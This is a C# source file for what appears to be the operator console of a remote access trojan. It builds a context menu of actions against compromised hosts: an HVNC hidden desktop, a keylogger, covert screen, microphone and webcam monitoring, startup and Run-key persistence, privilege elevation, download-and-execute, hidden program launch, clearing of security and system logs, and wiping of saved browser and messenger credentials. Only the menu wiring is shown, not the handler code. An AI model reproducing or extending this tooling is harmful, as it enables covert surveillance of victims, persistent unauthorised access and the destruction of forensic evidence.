using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using RemoteControl.Protocals;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using log4net;
using RemoteControl.Protocals.Plugin;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;
using RemoteControl.Audio;
using RemoteControl.Audio.Codecs;
using RemoteControl.Protocals.Utilities;
using RemoteControl.Protocals.Relay;
using RemoteControl.Server.Utils;
namespace RemoteControl.Server
{
    public partial class FrmMain
    {
        private void initClientContextMenu()
        {
            contextMenuStripClient = new ContextMenuStrip();

            // === 主机功能(Z) ===
            var menuHostFunc = new ToolStripMenuItem("主机功能(&Z)");
            menuHostFunc.DropDownItems.Add("文件管理(&F)", null, onMenuFileManager);
            menuHostFunc.DropDownItems.Add("屏幕监控(&S)", null, onMenuScreenCapture);
            menuHostFunc.DropDownItems.Add("高清屏幕", null, onMenuHDScreen);
            menuHostFunc.DropDownItems.Add("后台屏幕(&G)", null, onMenuBackgroundScreen);
            menuHostFunc.DropDownItems.Add("HVNC隐形桌面", null, onMenuHVNC);
            menuHostFunc.DropDownItems.Add("系统管理(&M)", null, onMenuSystemManager);
            menuHostFunc.DropDownItems.Add("视频查看(&V)", null, onMenuVideoCapture);
            menuHostFunc.DropDownItems.Add("远程终端(&T)", null, onMenuRemoteTerminal);
            menuHostFunc.DropDownItems.Add("语音监听(&W)", null, onMenuAudioCapture);
            menuHostFunc.DropDownItems.Add("开始键盘记录(&K)", null, onMenuKeyloggerStart);
            menuHostFunc.DropDownItems.Add("停止键盘记录", null, onMenuKeyloggerStop);
            menuHostFunc.DropDownItems.Add("服务管理(&S)", null, onMenuServiceManager);
            menuHostFunc.DropDownItems.Add("网络信息(&N)", null, onMenuNetworkInfo);
            menuHostFunc.DropDownItems.Add("注册表(&R)", null, onMenuRegistry);
            contextMenuStripClient.Items.Add(menuHostFunc);

            // === 主机分享 ===
            var menuHostShare = new ToolStripMenuItem("主机分享");
            menuHostShare.DropDownItems.Add("复制主机分享信息", null, onMenuCopyHostShareInfo);
            menuHostShare.DropDownItems.Add("导出主机分享信息", null, onMenuExportHostShareInfo);
            contextMenuStripClient.Items.Add(menuHostShare);

            // === 增强功能(I) ===
            var menuEnhanced = new ToolStripMenuItem("增强功能(&I)");
            menuEnhanced.DropDownItems.Add("写入启动", null, onMenuWriteStartup);
            menuEnhanced.DropDownItems.Add("写Run启动(&X)", null, onMenuWriteRunStartup);
            menuEnhanced.DropDownItems.Add("重启EXP(&E)", null, onMenuRestartExplorer);
            menuEnhanced.DropDownItems.Add("提升权限(&S)", null, onMenuElevatePrivilege);
            menuEnhanced.DropDownItems.Add("开关代理(&P)", null, onMenuToggleProxy);
            menuEnhanced.DropDownItems.Add("代理映射(&M)", null, onMenuProxyMapping);
            menuEnhanced.DropDownItems.Add("远程聊天(&C)", null, onMenuRemoteChat);
            menuEnhanced.DropDownItems.Add("娱乐功能(&H)", null, onMenuEntertainment);
            menuEnhanced.DropDownItems.Add("消息弹窗(&M)", null, onMenuMessageBox);
            menuEnhanced.DropDownItems.Add("更改备注(&B)", null, onMenuChangeRemark);
            menuEnhanced.DropDownItems.Add("查找进程(&P)", null, onMenuFindProcess);
            menuEnhanced.DropDownItems.Add("查找窗口(&W)", null, onMenuFindWindow);
            menuEnhanced.DropDownItems.Add("清除查找(&C)", null, onMenuClearFind);
            contextMenuStripClient.Items.Add(menuEnhanced);

            // === 附加功能(F) ===
            var menuAdditional = new ToolStripMenuItem("附加功能(&F)");
            menuAdditional.DropDownItems.Add("客户需求覆盖报告", null, onMenuShowCustomerCoverage);
            menuAdditional.DropDownItems.Add("受限功能说明", null, onMenuShowRestrictedFeatures);
            contextMenuStripClient.Items.Add(menuAdditional);

            // === 其他功能(O) ===
            var menuOther = new ToolStripMenuItem("其他功能(&O)");
            menuOther.DropDownItems.Add("本地上传(&L)", null, onMenuLocalUpload);
            menuOther.DropDownItems.Add("显示打开(&N)", null, onMenuShowOpen);
            menuOther.DropDownItems.Add("隐藏打开(&H)", null, onMenuHiddenOpen);
            menuOther.DropDownItems.Add("打开网址(&W)", null, onMenuOpenUrl);
            menuOther.DropDownItems.Add(new ToolStripSeparator());
            menuOther.DropDownItems.Add("下载执行(&D)", null, onMenuDownloadExec);
            menuOther.DropDownItems.Add("下载更新(&U)", null, onMenuDownloadUpdate);
            menuOther.DropDownItems.Add(new ToolStripSeparator());
            menuOther.DropDownItems.Add("复制IP地址(&I)", null, onMenuCopyIP);
            menuOther.DropDownItems.Add("复制所有信息(&A)", null, onMenuCopyAllInfo);
            menuOther.DropDownItems.Add("导出IP列表(&I)", null, onMenuExportIPList);
            contextMenuStripClient.Items.Add(menuOther);

            // === 会话管理(S) ===
            var menuSession = new ToolStripMenuItem("会话管理(&S)");
            menuSession.DropDownItems.Add("注销主机(&L)", null, onMenuLogoff);
            menuSession.DropDownItems.Add("重启主机(&R)", null, onMenuReboot);
            menuSession.DropDownItems.Add("关机命令(&S)", null, onMenuShutdown);
            menuSession.DropDownItems.Add(new ToolStripSeparator());
            menuSession.DropDownItems.Add("卸载主机(&U)", null, onMenuUninstall);
            contextMenuStripClient.Items.Add(menuSession);

            // === 清理日志(C) ===
            var menuClearLog = new ToolStripMenuItem("清理日志(&C)");
            menuClearLog.DropDownItems.Add("清理全部日志(&A)", null, onMenuClearAllLogs);
            menuClearLog.DropDownItems.Add("清理系统日志(&S)", null, onMenuClearSystemLog);
            menuClearLog.DropDownItems.Add("清理安全日志(&Q)", null, onMenuClearSecurityLog);
            menuClearLog.DropDownItems.Add("清理应用程序(&Y)", null, onMenuClearApplicationLog);
            contextMenuStripClient.Items.Add(menuClearLog);

            // === 更改分组(C) ===
            contextMenuStripClient.Items.Add("更改分组(&C)", null, onMenuChangeGroup);
            contextMenuStripClient.Items.Add("筛选主机(&F)", null, onMenuFilterHosts);

            // === 清除浏览器账号密码(X) ===
            var menuBrowser = new ToolStripMenuItem("清除浏览器账号密码(&X)");
            menuBrowser.DropDownItems.Add("删除IE历史记录", null, onMenuClearIE);
            menuBrowser.DropDownItems.Add("清除谷歌帐号密码", null, onMenuClearChrome);
            menuBrowser.DropDownItems.Add("清除Skype帐号密码", null, onMenuClearSkype);
            menuBrowser.DropDownItems.Add("清除火狐帐号密码", null, onMenuClearFirefox);
            menuBrowser.DropDownItems.Add("清除360帐号密码", null, onMenuClear360);
            menuBrowser.DropDownItems.Add("清除QQ帐号密码", null, onMenuClearQQ);
            menuBrowser.DropDownItems.Add("清除搜狗帐号密码", null, onMenuClearSogou);
            contextMenuStripClient.Items.Add(menuBrowser);

            // === 选择全部 / 取消选择 ===
            contextMenuStripClient.Items.Add(new ToolStripSeparator());
            contextMenuStripClient.Items.Add("选择全部(&A)", null, onMenuSelectAll);
            contextMenuStripClient.Items.Add("取消选择(&U)", null, onMenuDeselectAll);

            // 绑定到TreeView
            this.treeView1.ContextMenuStrip = contextMenuStripClient;
        }

        // ---- 主机功能 事件处理 ----
    }
}
